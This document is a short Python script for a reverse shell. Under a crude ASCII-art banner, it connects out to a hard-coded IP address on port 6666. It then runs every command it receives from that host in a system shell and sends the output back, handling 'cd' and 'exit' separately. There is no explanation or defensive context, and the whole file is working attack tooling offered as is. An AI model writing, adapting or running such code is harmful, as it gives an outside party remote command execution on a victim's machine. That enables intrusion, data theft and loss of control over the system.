import socket, subprocess, os, sys


def connect():
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 6666
    host = '10.101.200.30'
    s.connect((host, port))
    ART = """
______ _      _     ______                
|  _  (_)    | |    | ___ \                               
| | | |_  ___| | __ | |_/ /_____   _____ _ __ ___  ___ 
| | | | |/ __| |/ / |    // _ \ \ / / _ \ '__/ __|/ _ \
\n| |/ /| | (__|   <  | |\ \  __/\ V /  __/ |  \__ \  __/
|___/ |_|\___|_|\_\ \_| \_\___| \_/ \___|_|  |___/\___|

"""
    s.send(ART+str(os.getcwd()) + '> ')


def receive():
    receive = s.recv(1024)
    if receive.replace('\n', '') == "exit":
        s.close()
        sys.exit(0)
    else:
        proc2 = subprocess.Popen(receive, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        if receive[:2] == 'cd':
            if os.path.exists(str(receive[3:].replace('\n', ''))):
                os.chdir(str(receive[3:].replace('\n', '')))
                outBytes = proc2.stdout.read()
        else:
            outBytes = proc2.stdout.read() + proc2.stderr.read()
        args = outBytes
        send(args + str(os.getcwd()) + '> ')


def send(args):
    send = s.send(args)
    receive()


def main():
    connect()
    receive()
    s.close()


main()
